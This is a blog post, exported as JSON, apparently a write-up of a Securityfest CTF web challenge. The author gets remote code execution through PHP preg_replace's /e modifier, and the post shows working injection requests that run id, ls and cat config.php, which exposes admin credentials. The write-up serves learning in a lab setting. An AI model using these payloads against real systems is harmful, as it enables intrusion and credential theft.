{"data":{"markdownRemark":{"html":"<p>I actually learned something entirely new on this challenge, I decided I had to do a writeup to share my findings.</p>\n<p>If you read my <a href=\"https://dubell.io/securityfest-ctf-coresec-challenge-writeup/\">previous Securityfest CTF writeup</a> you perhaps know that these challenges were from <a href=\"https://securityfest.com/\">securityfest</a> held in Sweden, which I attended. I did not solve this particular challenge on time in order to win any prizes, but that didn't stop me from trying to solve it.</p>\n<p>The challenge is to get the flag by defacing this website <a href=\"http://alienzon.com/\">http://alienzon.com/</a> which is protected by <em>(simple)</em> <a href=\"https://www.owasp.org/index.php/Web_Application_Firewall\">WAF</a>. I actually spent 4-5 hours on this challenge testing different attack vectors that did not work. I tried SQL injections and XSS attacks all over the place but no joy. So I turned to the place where I thought would be the correct path because it most the most odd part of the website. It was on the <em>Fun Stuff</em> page under <strong>Be a hero in a star story!</strong> section. The odd thing about this part is that when you enter your name and click submit, the post request looks like this:</p>\n<div class=\"gatsby-highlight\" data-language=\"text\"><pre class=\"language-text\"><code class=\"language-text\">who=/Han+Solo/&amp;yourname=Hacker</code></pre></div>\n<p>Why are there forward slashes in the request?</p>\n<p>After playing with the <code class=\"language-text\">who</code> parameter for quite some time I realized that if I change the parameter to:</p>\n<div class=\"gatsby-highlight\" data-language=\"text\"><pre class=\"language-text\"><code class=\"language-text\">who=/Han/&amp;yourname=Hacker</code></pre></div>\n<p>The story on the next page would say <em>Hacker Solo</em>. It didn't click before but now I knew the backend code was most likely using <a href=\"http://php.net/manual/en/function.preg-replace.php\">preg_replace()</a> to replace the strings. This information at first didn't help me very much, I continued to change the parameter thinking I could perhaps trigger a XSS but nope.</p>\n<p>After a while I gave up and just googled <em>preg_replace exploits</em>, first website to show up was <a href=\"http://www.madirish.net/402\">http://www.madirish.net/402</a>. According to that website, if the <code class=\"language-text\">e</code> modifier is used with the regular expression, an attacker may have the possibility to execute PHP code. Armed with this new information I crafted this fine request:</p>\n<div class=\"gatsby-highlight\" data-language=\"text\"><pre class=\"language-text\"><code class=\"language-text\">who=/(Han)/e&amp;yourname=strtoupper($1)</code></pre></div>\n<p>I put <strong>Han</strong> in parentheses because that creates a group which you can match with the $1. The <code class=\"language-text\">strtoupper()</code> function simply converts a supplied string to uppercase. I sent the request away and checked the output, <em>Han</em> was now <em>HAN</em>, it goddamn worked. I now have a <a href=\"https://en.wikipedia.org/wiki/Arbitrary_code_execution\">RCE</a>.</p>\n<p>I sent the following request to identify the user running the web server:</p>\n<div class=\"gatsby-highlight\" data-language=\"text\"><pre class=\"language-text\"><code class=\"language-text\">who=/(Han)/e&amp;yourname=`id`</code></pre></div>\n<p>At first I tried double quotes but that didn't work, then I tried single quotes but that got blocked by the WAF. So I tried the <em>grave accent</em> character ` and voila, it worked. The user running the web server was <code class=\"language-text\">www-data</code>.</p>\n<p>Next was to list all the files in the directory:</p>\n<div class=\"gatsby-highlight\" data-language=\"text\"><pre class=\"language-text\"><code class=\"language-text\">who=/(Han)/e&amp;yourname=`ls -lah`</code></pre></div>\n<p>Then view the config.php file:</p>\n<div class=\"gatsby-highlight\" data-language=\"text\"><pre class=\"language-text\"><code class=\"language-text\">who=/(Han)/e&amp;yourname=`cat config.php`</code></pre></div>\n<p>Which gave me the following:</p>\n<div class=\"gatsby-highlight\" data-language=\"text\"><pre class=\"language-text\"><code class=\"language-text\">// Set the admin info here!\n$admin_username = &#39;admin&#39;;\n$admin_password = &#39;deepspace&#39;;\n[...]</code></pre></div>\n<p>Now I simply login with the above credentials and get the flag:</p>\n<div class=\"gatsby-highlight\" data-language=\"text\"><pre class=\"language-text\"><code class=\"language-text\">CODE{R3gular_Expr3ssions_Now_You_Have_2_Probl3ms}</code></pre></div>","timeToRead":3,"excerpt":"I actually learned something entirely new on this challenge, I decided I had to do a writeup to share my findings. If you read my  previousâ€¦","frontmatter":{"title":"Securityfest CTF - Defacer Challenge Writeup","slug":"securityfest-ctf-defacer-challenge-writeup","date":"2016-06-08T00:00:00.000Z","categories":["CTF"],"tags":["CTF"],"template":"post"},"fields":{"nextTitle":"Securityfest CTF - Coresec challenge writeup","nextSlug":"/securityfest-ctf-coresec-challenge-writeup/","prevTitle":"Monitoring your server with Monit","prevSlug":"/monitoring-your-server-with-monit/","slug":"/securityfest-ctf-defacer-challenge-writeup/","date":"2016-06-08T00:00:00.000Z"}}},"pageContext":{"slug":"/securityfest-ctf-defacer-challenge-writeup/"}}